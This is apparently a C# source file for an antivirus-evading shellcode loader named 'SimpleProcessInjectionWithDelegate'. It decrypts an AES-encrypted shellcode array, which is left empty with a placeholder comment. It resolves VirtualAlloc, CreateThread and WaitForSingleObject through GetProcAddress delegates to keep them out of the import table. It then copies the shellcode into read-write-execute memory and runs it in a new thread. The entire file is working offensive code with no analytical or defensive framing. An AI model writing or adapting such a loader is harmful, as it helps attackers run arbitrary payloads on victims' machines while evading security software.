using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace SimpleProcessInjectionWithDelegate
{
    internal class Program
    {
        public delegate IntPtr DelVirAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        public delegate IntPtr DelCreateTh(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        public delegate UInt32 DelWaiting(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        public const uint commit = 0x1000;
        public const uint reserve = 0x2000;
        public const uint erw = 0x40;
        public const uint infini = 0xFFFFFFFF;
        static void Main(string[] args)
        {
            byte[] Key = Convert.FromBase64String("UWvdzxNvawefjcAUkEQHeq==");
            byte[] IV = Convert.FromBase64String("WUcLtUFSRczMSaEHrdBBRD==");

            byte[] testy = new byte[] { };//ShellCode AES Encrypted
            byte[] chelly = AESDecrypt(testy, Key, IV);

            IntPtr loadvir = LoadLibrary("kernel32");
            IntPtr getvir = GetProcAddress(loadvir, "VirtualAlloc");
            DelVirAlloc delvirallaoc = (DelVirAlloc)Marshal.GetDelegateForFunctionPointer(getvir, typeof(DelVirAlloc));
            IntPtr advir = delvirallaoc(IntPtr.Zero, (uint)chelly.Length, commit | reserve, erw);

            Marshal.Copy(chelly, 0, advir, chelly.Length);

            IntPtr loadcreate = LoadLibrary("kernel32");
            IntPtr getcreate = GetProcAddress(loadcreate, "CreateThread");
            DelCreateTh delcreate = (DelCreateTh)Marshal.GetDelegateForFunctionPointer(getcreate, typeof(DelCreateTh));
            IntPtr th = delcreate(IntPtr.Zero, 0, advir, IntPtr.Zero, 0, IntPtr.Zero);

            IntPtr loadwait = LoadLibrary("kernel32.dll");
            IntPtr getwait = GetProcAddress(loadwait, "WaitForSingleObject");
            DelWaiting delwaiting = (DelWaiting)Marshal.GetDelegateForFunctionPointer(getwait, typeof(DelWaiting));
            delwaiting(th, infini);
        }

        private static byte[] AESDecrypt(byte[] CEncryptedShell, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 128;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.PKCS7;
                aes.Mode = CipherMode.CBC;
                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return GetDecrypt(CEncryptedShell, decryptor);
                }
            }
        }
        private static byte[] GetDecrypt(byte[] data, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(data, 0, data.Length);
                cryptoStream.FlushFinalBlock();

                return ms.ToArray();
            }
        }
    }
}
